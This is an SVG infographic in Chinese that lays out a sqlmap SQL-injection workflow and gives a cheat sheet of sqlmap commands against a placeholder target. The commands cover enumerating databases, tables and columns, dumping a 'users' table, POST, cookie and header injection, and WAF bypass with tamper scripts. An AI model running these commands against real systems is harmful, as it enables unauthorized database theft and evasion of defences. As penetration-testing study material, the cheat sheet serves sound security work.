<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 500" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="500" fill="#f8fafc"/>
  <defs>
    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#3182ce"/>
    </marker>
  </defs>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">SQL 注入自动化：sqlmap 工作流程</text>

  <rect x="40" y="60" width="150" height="50" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="115" y="92" font-size="11" text-anchor="middle" fill="#c53030" font-weight="bold">① 发现注入点</text>

  <line x1="190" y1="85" x2="225" y2="85" stroke="#3182ce" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="230" y="60" width="150" height="50" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="305" y="92" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">② 确定数据库</text>

  <line x1="380" y1="85" x2="415" y2="85" stroke="#3182ce" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="420" y="60" width="150" height="50" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="495" y="92" font-size="11" text-anchor="middle" fill="#805ad5" font-weight="bold">③ 枚举数据库</text>

  <line x1="570" y1="85" x2="605" y2="85" stroke="#3182ce" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="610" y="60" width="150" height="50" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="685" y="92" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">④ 读取表结构</text>

  <line x1="760" y1="85" x2="795" y2="85" stroke="#3182ce" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="800" y="60" width="170" height="50" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="885" y="92" font-size="11" text-anchor="middle" fill="#3182ce" font-weight="bold">⑤ Dump 数据</text>

  <rect x="40" y="140" width="460" height="330" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">sqlmap 命令实战</text>

  <text x="70" y="195" font-size="10" font-weight="bold" fill="#c53030">基础使用：</text>
  <text x="70" y="215" font-size="9" fill="#2d3748">sqlmap -u "http://target/page?id=1"</text>
  <text x="70" y="235" font-size="9" fill="#2d3748">sqlmap -r request.txt</text>

  <text x="70" y="265" font-size="10" font-weight="bold" fill="#805ad5">自动检测注入：</text>
  <text x="70" y="285" font-size="9" fill="#2d3748">sqlmap -u "http://target/page?id=1" --batch</text>
  <text x="70" y="305" font-size="9" fill="#2d3748">--batch: 非交互模式（全自动）</text>

  <text x="70" y="335" font-size="10" font-weight="bold" fill="#dd6b20">获取数据库名：</text>
  <text x="70" y="355" font-size="9" fill="#2d3748">sqlmap -u "..." --dbs</text>

  <text x="70" y="385" font-size="10" font-weight="bold" fill="#3182ce">获取表/列/数据：</text>
  <text x="70" y="405" font-size="9" fill="#2d3748">sqlmap -u "..." -D dbname --tables</text>
  <text x="70" y="425" font-size="9" fill="#2d3748">sqlmap -u "..." -D dbname -T users --columns</text>
  <text x="70" y="445" font-size="9" fill="#2d3748">sqlmap -u "..." -D dbname -T users --dump</text>

  <text x="70" y="475" font-size="10" font-weight="bold" fill="#38a169">指定注入类型：</text>
  <text x="70" y="485" font-size="9" fill="#2d3748">--technique=B（布尔盲注）</text>

  <rect x="520" y="140" width="440" height="330" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">Post 注入 / Cookie 注入</text>

  <text x="550" y="195" font-size="10" font-weight="bold" fill="#c53030">POST 注入：</text>
  <text x="550" y="215" font-size="9" fill="#2d3748">sqlmap -u "http://target/page" --data="id=1&name=test"</text>
  <text x="550" y="235" font-size="9" fill="#2d3748">或：sqlmap -r post_request.txt</text>

  <text x="550" y="265" font-size="10" font-weight="bold" fill="#805ad5">Cookie 注入：</text>
  <text x="550" y="285" font-size="9" fill="#2d3748">sqlmap -u "http://target/page" --cookie="id=1"</text>
  <text x="550" y="305" font-size="9" fill="#2d3748">sqlmap -u "http://target/page" --level=2</text>

  <text x="550" y="335" font-size="10" font-weight="bold" fill="#dd6b20">Header 注入：</text>
  <text x="550" y="355" font-size="9" fill="#2d3748">sqlmap -u "http://target/page" --level=3</text>
  <text x="550" y="375" font-size="9" fill="#2d3748">sqlmap -u "http://target/page" --level=5</text>

  <text x="550" y="405" font-size="10" font-weight="bold" fill="#3182ce">WAF 绕过：</text>
  <text x="550" y="425" font-size="9" fill="#2d3748">--tamper=space2comment.py</text>
  <text x="550" y="445" font-size="9" fill="#2d3748">--tamper=space2morehash.py</text>
  <text x="550" y="465" font-size="9" fill="#2d3748">--time-sec=5（时间盲注延迟）</text>
</svg>
